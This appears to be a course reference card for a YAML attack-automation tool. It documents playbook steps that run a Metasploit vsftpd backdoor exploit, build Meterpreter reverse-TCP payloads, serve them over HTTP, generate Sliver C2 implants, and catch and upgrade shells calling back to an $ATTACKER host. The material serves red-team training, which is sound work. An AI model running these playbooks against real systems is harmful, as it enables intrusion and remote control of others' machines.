# Module 7: Day 2 Command Reference Card

Quick reference for all command types and options covered today.

---

## `msf-module`: Run a Metasploit Module

```yaml
- type: msf-module
  cmd: exploit/unix/ftp/vsftpd_234_backdoor    # module path
  payload: cmd/unix/interact                   # payload (for exploits)
  options:                                     # module options
    RHOSTS: $TARGET
    RPORT: 21
  payload_options:                             # payload options
    LHOST: $ATTACKER
    LPORT: "4422"
  creates_session: shell                       # name to give the new session
  session: "1"                                 # existing session (for post modules)
  target: 0                                    # Metasploit target index (default: 0)
  kill_on_exit: True                           # kill background process on playbook exit
```

---

## `msf-session`: Execute a Command in a Session

```yaml
- type: msf-session
  session: shell                 # AttackMate session name (from creates_session)
  cmd: id                        # command to run
  stdapi: False                  # set True for Meterpreter built-in commands
  end_str: null                  # string marking end of output (optional)
```

---

## `msf-payload`: Generate a Payload Binary

```yaml
- type: msf-payload
  cmd: linux/x86/meterpreter/reverse_tcp   # payload name
  format: elf                              # elf, exe, raw, py, sh, ...
  local_path: /tmp/shell.elf               # where to save the output
  payload_options:                         # payload options
    LHOST: $ATTACKER
    LPORT: "4444"
  encoder: ""                              # e.g., x86/shikata_ga_nai
  iter: 0                                  # encoding iterations
```

---

## `webserv`: Serve a File over HTTP

```yaml
- type: webserv
  local_path: /tmp/shell.elf    # file to serve
  port: 8080                    # listening port (default: 8000)
  address: 0.0.0.0              # bind address
  keep_serving: False           # keep serving after first download
  background: True              # run without blocking
  kill_on_exit: True            # stop server when playbook ends
```

---

## `include`: Include Another Playbook

```yaml
- type: include
  local_path: ./includes/gather_commands.yml   # path to the include file
```

The include file contains only a `commands:` list. Variables are shared with the calling playbook.

---

## `sliver`: Manage the Sliver C2 Server

```yaml
# Start an HTTPS listener
- type: sliver
  cmd: start_https_listener
  host: 0.0.0.0
  port: "443"
  persistent: False

# Generate an implant
- type: sliver
  cmd: generate_implant
  name: my-implant
  c2url: https://$ATTACKER
  target: linux/amd64          # linux/amd64, windows/amd64, darwin/arm64, ...
  format: EXECUTABLE           # EXECUTABLE, SHARED_LIB, SERVICE, SHELLCODE
  filepath: /tmp/implant       # where to save the implant
  IsBeacon: False              # True = beacon (polls), False = session (persistent)
  BeaconInterval: 120          # check-in interval in seconds (beacons only)
```

---

## `sliver-session`: Interact with a Sliver Implant

```yaml
- type: sliver-session
  session: my-implant          # implant name (from generate_implant)
  cmd: ps                      # command: ps, pwd, ls, cd, execute, upload, download, ...
  # Command-specific options:
  remote_path: /path/on/target
  local_path: /path/on/attacker
  exe: /bin/id                 # for cmd: execute
  args: []                     # arguments for cmd: execute
```

---

## Builtin Variables (Day 2 Additions)

| Variable | Set By | Description |
|---|---|---|
| `$LAST_MSF_SESSION` | `msf-module` (on exploit success) | Numeric Metasploit session ID |
| `$LAST_SLIVER_IMPLANT` | `sliver` (`generate_implant`) | Path to the generated implant file |

These are in addition to the Day 1 builtins (`$RESULT_STDOUT`, `$RESULT_RETURNCODE`, etc.).

---

## Common Patterns

### Exploit and Run Post Module

```yaml
- type: msf-module
  cmd: exploit/unix/ftp/vsftpd_234_backdoor
  payload: cmd/unix/interact
  options:
    RHOSTS: $TARGET
  creates_session: shell

- type: msf-module
  cmd: post/linux/gather/enum_network
  options:
    SESSION: $LAST_MSF_SESSION
```

### Generate Payload, Serve It, Catch the Shell

```yaml
- type: mktemp
  cmd: file
  variable: PAYLOAD_FILE

- type: msf-payload
  cmd: linux/x86/meterpreter/reverse_tcp
  format: elf
  local_path: $PAYLOAD_FILE
  payload_options:
    LHOST: $ATTACKER
    LPORT: "4444"

- type: webserv
  local_path: $PAYLOAD_FILE
  port: 8080
  background: True
  kill_on_exit: True

- type: msf-module
  cmd: exploit/multi/handler
  payload: linux/x86/meterpreter/reverse_tcp
  payload_options:
    LHOST: $ATTACKER
    LPORT: "4444"
  creates_session: shell
  background: True
  kill_on_exit: True
```

### Upgrade Shell to Meterpreter

```yaml
- type: msf-module
  cmd: post/multi/manage/shell_to_meterpreter
  options:
    SESSION: $LAST_MSF_SESSION
  payload: linux/x86/meterpreter/reverse_tcp
  payload_options:
    LHOST: $ATTACKER
    LPORT: "4433"
  creates_session: meterpreter

- type: msf-session
  session: meterpreter
  stdapi: True
  cmd: sysinfo
```
